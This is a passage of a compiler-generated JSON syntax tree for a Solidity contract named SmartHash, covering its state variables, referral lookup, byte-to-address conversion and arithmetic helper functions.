                      "overloadedDeclarations": [],
                      "referencedDeclaration": 19,
                      "src": "2325:9:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
                        "typeString": "mapping(address => uint256)"
                      }
                    },
                    "id": 331,
                    "indexExpression": {
                      "argumentTypes": null,
                      "id": 330,
                      "name": "_address",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 324,
                      "src": "2335:8:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "isConstant": false,
                    "isLValue": true,
                    "isPure": false,
                    "lValueRequested": false,
                    "nodeType": "IndexAccess",
                    "src": "2325:19:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "functionReturnParameters": 328,
                  "id": 332,
                  "nodeType": "Return",
                  "src": "2318:26:0"
                }
              ]
            },
            "documentation": null,
            "id": 334,
            "implemented": true,
            "isConstructor": false,
            "isDeclaredConst": true,
            "modifiers": [],
            "name": "userReferralsWei",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 325,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 324,
                  "name": "_address",
                  "nodeType": "VariableDeclaration",
                  "scope": 334,
                  "src": "2266:16:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 323,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "2266:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "value": null,
                  "visibility": "internal"
                }
              ],
              "src": "2265:18:0"
            },
            "payable": false,
            "returnParameters": {
              "id": 328,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 327,
                  "name": "",
                  "nodeType": "VariableDeclaration",
                  "scope": 334,
                  "src": "2305:7:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 326,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "2305:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "value": null,
                  "visibility": "internal"
                }
              ],
              "src": "2304:9:0"
            },
            "scope": 344,
            "src": "2240:111:0",
            "stateMutability": "view",
            "superFunction": null,
            "visibility": "public"
          },
          {
            "body": {
              "id": 342,
              "nodeType": "Block",
              "src": "2425:52:0",
              "statements": [
                {
                  "externalReferences": [
                    {
                      "addr": {
                        "declaration": 339,
                        "isOffset": false,
                        "isSlot": false,
                        "src": "2443:4:0",
                        "valueSize": 1
                      }
                    },
                    {
                      "bys": {
                        "declaration": 336,
                        "isOffset": false,
                        "isSlot": false,
                        "src": "2461:3:0",
                        "valueSize": 1
                      }
                    }
                  ],
                  "id": 341,
                  "nodeType": "InlineAssembly",
                  "operations": "{\n    addr := mload(add(bys, 20))\n}",
                  "src": "2429:48:0"
                }
              ]
            },
            "documentation": null,
            "id": 343,
            "implemented": true,
            "isConstructor": false,
            "isDeclaredConst": true,
            "modifiers": [],
            "name": "bytesToAddress",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 337,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 336,
                  "name": "bys",
                  "nodeType": "VariableDeclaration",
                  "scope": 343,
                  "src": "2378:9:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_bytes_memory_ptr",
                    "typeString": "bytes"
                  },
                  "typeName": {
                    "id": 335,
                    "name": "bytes",
                    "nodeType": "ElementaryTypeName",
                    "src": "2378:5:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bytes_storage_ptr",
                      "typeString": "bytes"
                    }
                  },
                  "value": null,
                  "visibility": "internal"
                }
              ],
              "src": "2377:11:0"
            },
            "payable": false,
            "returnParameters": {
              "id": 340,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 339,
                  "name": "addr",
                  "nodeType": "VariableDeclaration",
                  "scope": 343,
                  "src": "2411:12:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 338,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "2411:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "value": null,
                  "visibility": "internal"
                }
              ],
              "src": "2410:14:0"
            },
            "scope": 344,
            "src": "2354:123:0",
            "stateMutability": "pure",
            "superFunction": null,
            "visibility": "private"
          }
        ],
        "scope": 345,
        "src": "25:2454:0"
      }
    ],
    "src": "0:2479:0"
  },
  "legacyAST": {
    "attributes": {
      "absolutePath": "project:/contracts/Test1.sol",
      "exportedSymbols": {
        "SmartHash": [
          344
        ]
      }
    },
    "children": [
      {
        "attributes": {
          "literals": [
            "solidity",
            "^",
            "0.4",
            ".25"
          ]
        },
        "id": 1,
        "name": "PragmaDirective",
        "src": "0:24:0"
      },
      {
        "attributes": {
          "baseContracts": [
            null
          ],
          "contractDependencies": [
            null
          ],
          "contractKind": "contract",
          "documentation": null,
          "fullyImplemented": true,
          "linearizedBaseContracts": [
            344
          ],
          "name": "SmartHash",
          "scope": 345
        },
        "children": [
          {
            "attributes": {
              "constant": true,
              "name": "admAddress",
              "scope": 344,
              "stateVariable": true,
              "storageLocation": "default",
              "type": "address",
              "visibility": "public"
            },
            "children": [
              {
                "attributes": {
                  "name": "address",
                  "type": "address"
                },
                "id": 2,
                "name": "ElementaryTypeName",
                "src": "47:7:0"
              },
              {
                "attributes": {
                  "argumentTypes": null,
                  "hexvalue": "307862356138383563373936446244343635363334353535316363343164334538383434616338633034",
                  "isConstant": false,
                  "isLValue": false,
                  "isPure": true,
                  "lValueRequested": false,
                  "subdenomination": null,
                  "token": "number",
                  "type": "address",
                  "value": "0xb5a885c796DbD4656345551cc41d3E8844ac8c04"
                },
                "id": 3,
                "name": "Literal",
                "src": "84:42:0"
              }
            ],
            "id": 4,
            "name": "VariableDeclaration",
            "src": "47:79:0"
          },
          {
            "attributes": {
              "constant": true,
              "name": "advAddress",
              "scope": 344,
              "stateVariable": true,
              "storageLocation": "default",
              "type": "address",
              "visibility": "public"
            },
            "children": [
              {
                "attributes": {
                  "name": "address",
                  "type": "address"
                },
                "id": 5,
                "name": "ElementaryTypeName",
                "src": "129:7:0"
              },
              {
                "attributes": {
                  "argumentTypes": null,
                  "hexvalue": "307864303339366141456362353534373737363835326142383638324261373245313230396235333664",
                  "isConstant": false,
                  "isLValue": false,
                  "isPure": true,
                  "lValueRequested": false,
                  "subdenomination": null,
                  "token": "number",
                  "type": "address",
                  "value": "0xd0396aAEcb5547776852aB8682Ba72E1209b536d"
                },
                "id": 6,
                "name": "Literal",
                "src": "166:42:0"
              }
            ],
            "id": 7,
            "name": "VariableDeclaration",
            "src": "129:79:0"
          },
          {
            "attributes": {
              "constant": false,
              "name": "deposited",
              "scope": 344,
              "stateVariable": true,
              "storageLocation": "default",
              "type": "mapping(address => uint256)",
              "value": null,
              "visibility": "internal"
            },
            "children": [
              {
                "attributes": {
                  "type": "mapping(address => uint256)"
                },
                "children": [
                  {
                    "attributes": {
                      "name": "address",
                      "type": "address"
                    },
                    "id": 8,
                    "name": "ElementaryTypeName",
                    "src": "221:7:0"
                  },
                  {
                    "attributes": {
                      "name": "uint256",
                      "type": "uint256"
                    },
                    "id": 9,
                    "name": "ElementaryTypeName",
                    "src": "232:7:0"
                  }
                ],
                "id": 10,
                "name": "Mapping",
                "src": "212:28:0"
              }
            ],
            "id": 11,
            "name": "VariableDeclaration",
            "src": "212:38:0"
          },
          {
            "attributes": {
              "constant": false,
              "name": "withdrew",
              "scope": 344,
              "stateVariable": true,
              "storageLocation": "default",
              "type": "mapping(address => uint256)",
              "value": null,
              "visibility": "internal"
            },
            "children": [
              {
                "attributes": {
                  "type": "mapping(address => uint256)"
                },
                "children": [
                  {
                    "attributes": {
                      "name": "address",
                      "type": "address"
                    },
                    "id": 12,
                    "name": "ElementaryTypeName",
                    "src": "262:7:0"
                  },
                  {
                    "attributes": {
                      "name": "uint256",
                      "type": "uint256"
                    },
                    "id": 13,
                    "name": "ElementaryTypeName",
                    "src": "273:7:0"
                  }
                ],
                "id": 14,
                "name": "Mapping",
                "src": "253:28:0"
              }
            ],
            "id": 15,
            "name": "VariableDeclaration",
            "src": "253:37:0"
          },
          {
            "attributes": {
              "constant": false,
              "name": "refearned",
              "scope": 344,
              "stateVariable": true,
              "storageLocation": "default",
              "type": "mapping(address => uint256)",
              "value": null,
              "visibility": "internal"
            },
            "children": [
              {
                "attributes": {
                  "type": "mapping(address => uint256)"
                },
                "children": [
                  {
                    "attributes": {
                      "name": "address",
                      "type": "address"
                    },
                    "id": 16,
                    "name": "ElementaryTypeName",
                    "src": "302:7:0"
                  },
                  {
                    "attributes": {
                      "name": "uint256",
                      "type": "uint256"
                    },
                    "id": 17,
                    "name": "ElementaryTypeName",
                    "src": "313:7:0"
                  }
                ],
                "id": 18,
                "name": "Mapping",
                "src": "293:28:0"
              }
            ],
            "id": 19,
            "name": "VariableDeclaration",
            "src": "293:38:0"
          },
          {
            "attributes": {
              "constant": false,
              "name": "blocklock",
              "scope": 344,
              "stateVariable": true,
              "storageLocation": "default",
              "type": "mapping(address => uint256)",
              "value": null,
              "visibility": "internal"
            },
            "children": [
              {
                "attributes": {
                  "type": "mapping(address => uint256)"
                },
                "children": [
                  {
                    "attributes": {
                      "name": "address",
                      "type": "address"
                    },
                    "id": 20,
                    "name": "ElementaryTypeName",
                    "src": "343:7:0"
                  },
                  {
                    "attributes": {
                      "name": "uint256",
                      "type": "uint256"
                    },
                    "id": 21,
                    "name": "ElementaryTypeName",
                    "src": "354:7:0"
                  }
                ],
                "id": 22,
                "name": "Mapping",
                "src": "334:28:0"
              }
            ],
            "id": 23,
            "name": "VariableDeclaration",
            "src": "334:38:0"
          },
          {
            "attributes": {
              "constant": false,
              "name": "totalDepositedWei",
              "scope": 344,
              "stateVariable": true,
              "storageLocation": "default",
              "type": "uint256",
              "visibility": "public"
            },
            "children": [
              {
                "attributes": {
                  "name": "uint256",
                  "type": "uint256"
                },
                "id": 24,
                "name": "ElementaryTypeName",
                "src": "376:7:0"
              },
              {
                "attributes": {
                  "argumentTypes": null,
                  "hexvalue": "30",
                  "isConstant": false,
                  "isLValue": false,
                  "isPure": true,
                  "lValueRequested": false,
                  "subdenomination": null,
                  "token": "number",
                  "type": "int_const 0",
                  "value": "0"
                },
                "id": 25,
                "name": "Literal",
                "src": "411:1:0"
              }
            ],
            "id": 26,
            "name": "VariableDeclaration",
            "src": "376:36:0"
          },
          {
            "attributes": {
              "constant": false,
              "name": "totalWithdrewWei",
              "scope": 344,
              "stateVariable": true,
              "storageLocation": "default",
              "type": "uint256",
              "visibility": "public"
            },
            "children": [
              {
                "attributes": {
                  "name": "uint256",
                  "type": "uint256"
                },
                "id": 27,
                "name": "ElementaryTypeName",
                "src": "415:7:0"
              },
              {
                "attributes": {
                  "argumentTypes": null,
                  "hexvalue": "30",
                  "isConstant": false,
                  "isLValue": false,
                  "isPure": true,
                  "lValueRequested": false,
                  "subdenomination": null,
                  "token": "number",
                  "type": "int_const 0",
                  "value": "0"
                },
                "id": 28,
                "name": "Literal",
                "src": "449:1:0"
              }
            ],
            "id": 29,
            "name": "VariableDeclaration",
            "src": "415:35:0"
          },
          {
            "attributes": {
              "constant": true,
              "documentation": null,
              "implemented": true,
              "isConstructor": false,
              "modifiers": [
                null
              ],
              "name": "mul",
              "payable": false,
              "scope": 344,
              "stateMutability": "pure",
              "superFunction": null,
              "visibility": "internal"
            },
            "children": [
              {
                "children": [
                  {
                    "attributes": {
                      "constant": false,
                      "name": "_a",
                      "scope": 62,
                      "stateVariable": false,
                      "storageLocation": "default",
                      "type": "uint256",
                      "value": null,
                      "visibility": "internal"
                    },
                    "children": [
                      {
                        "attributes": {
                          "name": "uint256",
                          "type": "uint256"
                        },
                        "id": 30,
                        "name": "ElementaryTypeName",
                        "src": "469:7:0"
                      }
                    ],
                    "id": 31,
                    "name": "VariableDeclaration",
                    "src": "469:10:0"
                  },
                  {
                    "attributes": {
                      "constant": false,
                      "name": "_b",
                      "scope": 62,
                      "stateVariable": false,
                      "storageLocation": "default",
                      "type": "uint256",
                      "value": null,
                      "visibility": "internal"
                    },
                    "children": [
                      {
                        "attributes": {
                          "name": "uint256",
                          "type": "uint256"
                        },
                        "id": 32,
                        "name": "ElementaryTypeName",
                        "src": "481:7:0"
                      }
                    ],
                    "id": 33,
                    "name": "VariableDeclaration",
                    "src": "481:10:0"
                  }
                ],
                "id": 34,
                "name": "ParameterList",
                "src": "468:24:0"
              },
              {
                "children": [
                  {
                    "attributes": {
                      "constant": false,
                      "name": "c",
                      "scope": 62,
                      "stateVariable": false,
                      "storageLocation": "default",
                      "type": "uint256",
                      "value": null,
                      "visibility": "internal"
                    },
                    "children": [
                      {
                        "attributes": {
                          "name": "uint256",
                          "type": "uint256"
                        },
                        "id": 35,
                        "name": "ElementaryTypeName",
                        "src": "516:7:0"
                      }
                    ],
                    "id": 36,
                    "name": "VariableDeclaration",
                    "src": "516:9:0"
                  }
                ],
                "id": 37,
                "name": "ParameterList",
                "src": "515:11:0"
              },
              {
                "children": [
                  {
                    "attributes": {
                      "falseBody": null
                    },
                    "children": [
                      {
                        "attributes": {
                          "argumentTypes": null,
                          "commonType": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "operator": "==",
                          "type": "bool"
                        },
                        "children": [
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "overloadedDeclarations": [
                                null
                              ],
                              "referencedDeclaration": 31,
                              "type": "uint256",
                              "value": "_a"
                            },
                            "id": 38,
                            "name": "Identifier",
                            "src": "537:2:0"
                          },
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "hexvalue": "30",
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "subdenomination": null,
                              "token": "number",
                              "type": "int_const 0",
                              "value": "0"
                            },
                            "id": 39,
                            "name": "Literal",
                            "src": "543:1:0"
                          }
                        ],
                        "id": 40,
                        "name": "BinaryOperation",
                        "src": "537:7:0"
                      },
                      {
                        "children": [
                          {
                            "attributes": {
                              "functionReturnParameters": 37
                            },
                            "children": [
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "hexvalue": "30",
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": true,
                                  "lValueRequested": false,
                                  "subdenomination": null,
                                  "token": "number",
                                  "type": "int_const 0",
                                  "value": "0"
                                },
                                "id": 41,
                                "name": "Literal",
                                "src": "561:1:0"
                              }
                            ],
                            "id": 42,
                            "name": "Return",
                            "src": "554:8:0"
                          }
                        ],
                        "id": 43,
                        "name": "Block",
                        "src": "546:23:0"
                      }
                    ],
                    "id": 44,
                    "name": "IfStatement",
                    "src": "533:36:0"
                  },
                  {
                    "children": [
                      {
                        "attributes": {
                          "argumentTypes": null,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "operator": "=",
                          "type": "uint256"
                        },
                        "children": [
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "overloadedDeclarations": [
                                null
                              ],
                              "referencedDeclaration": 36,
                              "type": "uint256",
                              "value": "c"
                            },
                            "id": 45,
                            "name": "Identifier",
                            "src": "574:1:0"
                          },
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "commonType": {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              },
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "lValueRequested": false,
                              "operator": "*",
                              "type": "uint256"
                            },
                            "children": [
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "overloadedDeclarations": [
                                    null
                                  ],
                                  "referencedDeclaration": 31,
                                  "type": "uint256",
                                  "value": "_a"
                                },
                                "id": 46,
                                "name": "Identifier",
                                "src": "578:2:0"
                              },
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "overloadedDeclarations": [
                                    null
                                  ],
                                  "referencedDeclaration": 33,
                                  "type": "uint256",
                                  "value": "_b"
                                },
                                "id": 47,
                                "name": "Identifier",
                                "src": "583:2:0"
                              }
                            ],
                            "id": 48,
                            "name": "BinaryOperation",
                            "src": "578:7:0"
                          }
                        ],
                        "id": 49,
                        "name": "Assignment",
                        "src": "574:11:0"
                      }
                    ],
                    "id": 50,
                    "name": "ExpressionStatement",
                    "src": "574:11:0"
                  },
                  {
                    "children": [
                      {
                        "attributes": {
                          "argumentTypes": null,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "isStructConstructorCall": false,
                          "lValueRequested": false,
                          "names": [
                            null
                          ],
                          "type": "tuple()",
                          "type_conversion": false
                        },
                        "children": [
                          {
                            "attributes": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_bool",
                                  "typeString": "bool"
                                }
                              ],
                              "overloadedDeclarations": [
                                null
                              ],
                              "referencedDeclaration": 348,
                              "type": "function (bool) pure",
                              "value": "assert"
                            },
                            "id": 51,
                            "name": "Identifier",
                            "src": "591:6:0"
                          },
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "commonType": {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              },
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "lValueRequested": false,
                              "operator": "==",
                              "type": "bool"
                            },
                            "children": [
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "commonType": {
                                    "typeIdentifier": "t_uint256",
                                    "typeString": "uint256"
                                  },
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": false,
                                  "lValueRequested": false,
                                  "operator": "/",
                                  "type": "uint256"
                                },
                                "children": [
                                  {
                                    "attributes": {
                                      "argumentTypes": null,
                                      "overloadedDeclarations": [
                                        null
                                      ],
                                      "referencedDeclaration": 36,
                                      "type": "uint256",
                                      "value": "c"
                                    },
                                    "id": 52,
                                    "name": "Identifier",
                                    "src": "598:1:0"
                                  },
                                  {
                                    "attributes": {
                                      "argumentTypes": null,
                                      "overloadedDeclarations": [
                                        null
                                      ],
                                      "referencedDeclaration": 31,
                                      "type": "uint256",
                                      "value": "_a"
                                    },
                                    "id": 53,
                                    "name": "Identifier",
                                    "src": "602:2:0"
                                  }
                                ],
                                "id": 54,
                                "name": "BinaryOperation",
                                "src": "598:6:0"
                              },
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "overloadedDeclarations": [
                                    null
                                  ],
                                  "referencedDeclaration": 33,
                                  "type": "uint256",
                                  "value": "_b"
                                },
                                "id": 55,
                                "name": "Identifier",
                                "src": "608:2:0"
                              }
                            ],
                            "id": 56,
                            "name": "BinaryOperation",
                            "src": "598:12:0"
                          }
                        ],
                        "id": 57,
                        "name": "FunctionCall",
                        "src": "591:20:0"
                      }
                    ],
                    "id": 58,
                    "name": "ExpressionStatement",
                    "src": "591:20:0"
                  },
                  {
                    "attributes": {
                      "functionReturnParameters": 37
                    },
                    "children": [
                      {
                        "attributes": {
                          "argumentTypes": null,
                          "overloadedDeclarations": [
                            null
                          ],
                          "referencedDeclaration": 36,
                          "type": "uint256",
                          "value": "c"
                        },
                        "id": 59,
                        "name": "Identifier",
                        "src": "624:1:0"
                      }
                    ],
                    "id": 60,
                    "name": "Return",
                    "src": "617:8:0"
                  }
                ],
                "id": 61,
                "name": "Block",
                "src": "527:103:0"
              }
            ],
            "id": 62,
            "name": "FunctionDefinition",
            "src": "456:174:0"
          },
          {
            "attributes": {
              "constant": true,
              "documentation": null,
              "implemented": true,
              "isConstructor": false,
              "modifiers": [
                null
              ],
              "name": "div",
              "payable": false,
              "scope": 344,
              "stateMutability": "pure",
              "superFunction": null,
              "visibility": "internal"
            },
            "children": [
              {
                "children": [
                  {
                    "attributes": {
                      "constant": false,
                      "name": "_a",
                      "scope": 76,
                      "stateVariable": false,
                      "storageLocation": "default",
                      "type": "uint256",
                      "value": null,
                      "visibility": "internal"
                    },
                    "children": [
                      {
                        "attributes": {
                          "name": "uint256",
                          "type": "uint256"
                        },
                        "id": 63,
                        "name": "ElementaryTypeName",
                        "src": "647:7:0"
                      }
                    ],
                    "id": 64,
                    "name": "VariableDeclaration",
                    "src": "647:10:0"
                  },
                  {
                    "attributes": {
                      "constant": false,
                      "name": "_b",
                      "scope": 76,
                      "stateVariable": false,
                      "storageLocation": "default",
                      "type": "uint256",
                      "value": null,
                      "visibility": "internal"
                    },
                    "children": [
                      {
                        "attributes": {
                          "name": "uint256",
                          "type": "uint256"
                        },
                        "id": 65,
                        "name": "ElementaryTypeName",
                        "src": "659:7:0"
                      }
                    ],
                    "id": 66,
                    "name": "VariableDeclaration",
                    "src": "659:10:0"
                  }
                ],
                "id": 67,
                "name": "ParameterList",
                "src": "646:24:0"
              },
              {
                "children": [
                  {
                    "attributes": {
                      "constant": false,
                      "name": "",
                      "scope": 76,
                      "stateVariable": false,
                      "storageLocation": "default",
                      "type": "uint256",
                      "value": null,
                      "visibility": "internal"
                    },
                    "children": [
                      {
                        "attributes": {
                          "name": "uint256",
                          "type": "uint256"
                        },
                        "id": 68,
                        "name": "ElementaryTypeName",
                        "src": "694:7:0"
                      }
                    ],
                    "id": 69,
                    "name": "VariableDeclaration",
                    "src": "694:7:0"
                  }
                ],
                "id": 70,
                "name": "ParameterList",
                "src": "693:9:0"
              },
              {
                "children": [
                  {
                    "attributes": {
                      "functionReturnParameters": 70
                    },
                    "children": [
                      {
                        "attributes": {
                          "argumentTypes": null,
                          "commonType": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "operator": "/",
                          "type": "uint256"
                        },
                        "children": [
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "overloadedDeclarations": [
                                null
                              ],
                              "referencedDeclaration": 64,
                              "type": "uint256",
                              "value": "_a"
                            },
                            "id": 71,
                            "name": "Identifier",
                            "src": "716:2:0"
                          },
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "overloadedDeclarations": [
                                null
                              ],
                              "referencedDeclaration": 66,
                              "type": "uint256",
                              "value": "_b"
                            },
                            "id": 72,
                            "name": "Identifier",
                            "src": "721:2:0"
                          }
                        ],
                        "id": 73,
                        "name": "BinaryOperation",
                        "src": "716:7:0"
                      }
                    ],
                    "id": 74,
                    "name": "Return",
                    "src": "709:14:0"
                  }
                ],
                "id": 75,
                "name": "Block",
                "src": "703:25:0"
              }
            ],
            "id": 76,
            "name": "FunctionDefinition",
            "src": "634:94:0"
          },
          {
            "attributes": {
              "constant": true,
              "documentation": null,
              "implemented": true,
              "isConstructor": false,
              "modifiers": [
                null
              ],
              "name": "sub",
              "payable": false,
              "scope": 344,
              "stateMutability": "pure",
              "superFunction": null,
              "visibility": "internal"
            },
            "children": [
              {
                "children": [
                  {
                    "attributes": {
                      "constant": false,
                      "name": "_a",
                      "scope": 96,
                      "stateVariable": false,
                      "storageLocation": "default",
                      "type": "uint256",
                      "value": null,
                      "visibility": "internal"
                    },
                    "children": [
                      {
                        "attributes": {
                          "name": "uint256",
                          "type": "uint256"
                        },
                        "id": 77,
                        "name": "ElementaryTypeName",
                        "src": "745:7:0"
                      }
                    ],
                    "id": 78,
                    "name": "VariableDeclaration",
                    "src": "745:10:0"
                  },
                  {
                    "attributes": {
                      "constant": false,
                      "name": "_b",
                      "scope": 96,
                      "stateVariable": false,
                      "storageLocation": "default",
                      "type": "uint256",
                      "value": null,
                      "visibility": "internal"
                    },
                    "children": [
                      {
                        "attributes": {
                          "name": "uint256",
                          "type": "uint256"
                        },
                        "id": 79,
                        "name": "ElementaryTypeName",
                        "src": "757:7:0"
                      }
                    ],
                    "id": 80,
                    "name": "VariableDeclaration",
                    "src": "757:10:0"
                  }
                ],
                "id": 81,
                "name": "ParameterList",
                "src": "744:24:0"
              },
              {
                "children": [
                  {
                    "attributes": {
                      "constant": false,
                      "name": "",
                      "scope": 96,
                      "stateVariable": false,
                      "storageLocation": "default",
                      "type": "uint256",
                      "value": null,
                      "visibility": "internal"
                    },
                    "children": [
                      {
                        "attributes": {
                          "name": "uint256",
                          "type": "uint256"
                        },
                        "id": 82,
                        "name": "ElementaryTypeName",
                        "src": "792:7:0"
                      }
                    ],
                    "id": 83,
                    "name": "VariableDeclaration",
                    "src": "792:7:0"
                  }
                ],
                "id": 84,
                "name": "ParameterList",
                "src": "791:9:0"
              },
              {
                "children": [
                  {
                    "children": [
                      {
                        "attributes": {
                          "argumentTypes": null,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "isStructConstructorCall": false,
                          "lValueRequested": false,
                          "names": [
                            null
                          ],
                          "type": "tuple()",
                          "type_conversion": false
                        },
                        "children": [
                          {
                            "attributes": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_bool",
                                  "typeString": "bool"
                                }
                              ],
                              "overloadedDeclarations": [
                                null
                              ],
                              "referencedDeclaration": 348,
                              "type": "function (bool) pure",
                              "value": "assert"
                            },
                            "id": 85,
                            "name": "Identifier",
                            "src": "807:6:0"
                          },
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "commonType": {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              },
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "lValueRequested": false,
                              "operator": "<=",
                              "type": "bool"
                            },
                            "children": [
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "overloadedDeclarations": [
                                    null
                                  ],
                                  "referencedDeclaration": 80,
                                  "type": "uint256",
                                  "value": "_b"
                                },
                                "id": 86,
                                "name": "Identifier",
                                "src": "814:2:0"
                              },
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "overloadedDeclarations": [
                                    null
                                  ],
                                  "referencedDeclaration": 78,
                                  "type": "uint256",
                                  "value": "_a"
                                },
                                "id": 87,
                                "name": "Identifier",
                                "src": "820:2:0"
                              }
                            ],
                            "id": 88,
                            "name": "BinaryOperation",
                            "src": "814:8:0"
                          }
                        ],
                        "id": 89,
                        "name": "FunctionCall",
                        "src": "807:16:0"
                      }
                    ],
                    "id": 90,
                    "name": "ExpressionStatement",
                    "src": "807:16:0"
                  },
                  {
                    "attributes": {
                      "functionReturnParameters": 84
                    },
                    "children": [
                      {
                        "attributes": {
                          "argumentTypes": null,
                          "commonType": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "operator": "-",
                          "type": "uint256"
                        },
                        "children": [
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "overloadedDeclarations": [
                                null
                              ],
                              "referencedDeclaration": 78,
                              "type": "uint256",
                              "value": "_a"
                            },
                            "id": 91,
                            "name": "Identifier",
                            "src": "836:2:0"
                          },
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "overloadedDeclarations": [
                                null
                              ],
                              "referencedDeclaration": 80,
                              "type": "uint256",
                              "value": "_b"
                            },
                            "id": 92,
                            "name": "Identifier",
                            "src": "841:2:0"
                          }
                        ],
                        "id": 93,
                        "name": "BinaryOperation",
                        "src": "836:7:0"
                      }
                    ],
                    "id": 94,
                    "name": "Return",
                    "src": "829:14:0"
                  }
                ],
                "id": 95,
                "name": "Block",
                "src": "801:47:0"
              }
            ],
            "id": 96,
            "name": "FunctionDefinition",
            "src": "732:116:0"
          },
          {
            "attributes": {
              "constant": true,
              "documentation": null,
              "implemented": true,
              "isConstructor": false,
              "modifiers": [
                null
              ],
              "name": "add",
              "payable": false,
              "scope": 344,
              "stateMutability": "pure",
              "superFunction": null,
              "visibility": "internal"
            },
            "children": [
              {
                "children": [
                  {
                    "attributes": {
                      "constant": false,
                      "name": "_a",
                      "scope": 120,
                      "stateVariable": false,
                      "storageLocation": "default",
                      "type": "uint256",
                      "value": null,
                      "visibility": "internal"
                    },
                    "children": [
                      {
                        "attributes": {
                          "name": "uint256",
                          "type": "uint256"
                        },
                        "id": 97,
                        "name": "ElementaryTypeName",
                        "src": "865:7:0"
                      }
                    ],
                    "id": 98,
                    "name": "VariableDeclaration",
                    "src": "865:10:0"
                  },
                  {
                    "attributes": {
                      "constant": false,
                      "name": "_b",
                      "scope": 120,
                      "stateVariable": false,
                      "storageLocation": "default",
                      "type": "uint256",
                      "value": null,
                      "visibility": "internal"
                    },
                    "children": [
                      {
                        "attributes": {
                          "name": "uint256",
                          "type": "uint256"
                        },
                        "id": 99,
                        "name": "ElementaryTypeName",
                        "src": "877:7:0"
                      }
                    ],
                    "id": 100,
                    "name": "VariableDeclaration",
                    "src": "877:10:0"
                  }
                ],
                "id": 101,
                "name": "ParameterList",
                "src": "864:24:0"
              },
              {
                "children": [
                  {
                    "attributes": {
                      "constant": false,
                      "name": "c",
                      "scope": 120,
                      "stateVariable": false,
                      "storageLocation": "default",
                      "type": "uint256",
                      "value": null,
                      "visibility": "internal"
                    },
                    "children": [
                      {
                        "attributes": {
                          "name": "uint256",
                          "type": "uint256"
                        },
                        "id": 102,
                        "name": "ElementaryTypeName",
                        "src": "912:7:0"
                      }
                    ],
                    "id": 103,
                    "name": "VariableDeclaration",
                    "src": "912:9:0"
                  }
                ],
                "id": 104,
